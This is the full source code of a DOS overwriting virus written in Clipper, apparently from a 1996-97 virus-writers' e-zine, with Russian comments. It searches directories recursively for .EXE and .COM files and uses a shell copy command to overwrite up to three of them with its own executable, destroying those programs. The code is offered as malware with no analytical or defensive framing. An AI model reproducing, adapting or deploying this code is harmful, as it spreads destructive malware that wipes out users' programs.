// [Death Virii Crew] Presents
// CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997

// Вирий написанный на Clipper 5.01r
#Include "Directry.ch"
Counter:=0
MyName:="Ask Me Why"
Iamis:="\"+CurDir()+"\"+procname()+".EXE"                 // А как меня сейчас зовут ???
declare MyDan[adir(procname()+".EXE")]
declare MySize[adir(procname()+".EXE")]
adir(procname()+".EXE",MyDan,MySize)
Alldir("")
Quit
//
function GetOnlyDir(fn,fa,fs)
if (fa=="D")
 if (fn!='.')
  if (fn!='..')
      aadd(SubDir,fn)
  endif
 endif
else
 if at('.EXE',Fn)>0
      aadd(aExe,{fn,fs})
 endif
 if at('.COM',fn)>0
      aadd(aExe,{fn,fs})
 endif

endif
return NIL
//
function AllDir(Rootname)
Private SubDir,aDirectory,aExe
SubDir:={}
aExe:={}
rootname:=rootname+'\'
aDirectory:=Directory(rootname+"*.*","D")
aeval(aDirectory,{|aDir|GetOnlyDir(adir[F_NAME],aDir[F_ATTR],adir[F_SIZE])})
// Взял поддиректории и ...
aeval(aExe,{|NameExe| infected(rootname+NameExe[1],NameExe[2])})
aeval(SubDir,{|NameSubDir| AllDir(rootname+NameSubDir)})
return NIL
//
function infected(FuckFile,FFS)
if (counter<3).and.(FFS!=MySize[1])
   run ("command.com /c copy "+Iamis+" "+FuckFile+" >NUL")
   counter:= counter+1
endif
return NIL
